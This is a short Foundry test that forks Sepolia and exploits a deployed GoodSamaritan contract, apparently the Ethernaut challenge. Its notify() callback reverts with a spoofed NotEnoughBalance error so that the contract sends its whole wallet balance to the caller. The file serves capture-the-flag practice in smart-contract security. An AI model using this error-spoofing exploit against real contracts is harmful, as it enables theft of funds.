// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GoodSamaritan, Coin, Wallet} from "../src/GoodSamaritan.sol";

contract GoodSamaritanTest is Test {
    error NotEnoughBalance();

    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6701177);
    }

    function test_RequestDonation() public {
        GoodSamaritan goodSamaritan = GoodSamaritan(0xab1179fbcEAC9EdBec7F7Fbe8DeC853B25f35094);

        Coin coin = goodSamaritan.coin();

        Wallet wallet = goodSamaritan.wallet();

        // for(uint256 i = 0; i < 100000;i++) {
        //     goodSamaritan.requestDonation();
        // }

        goodSamaritan.requestDonation();

        console.log("user balance : ", coin.balances(address(this)));

        console.log("wallet balance : ", coin.balances(address(wallet)));
    }

    function notify(uint256 amount) external {
        if(amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
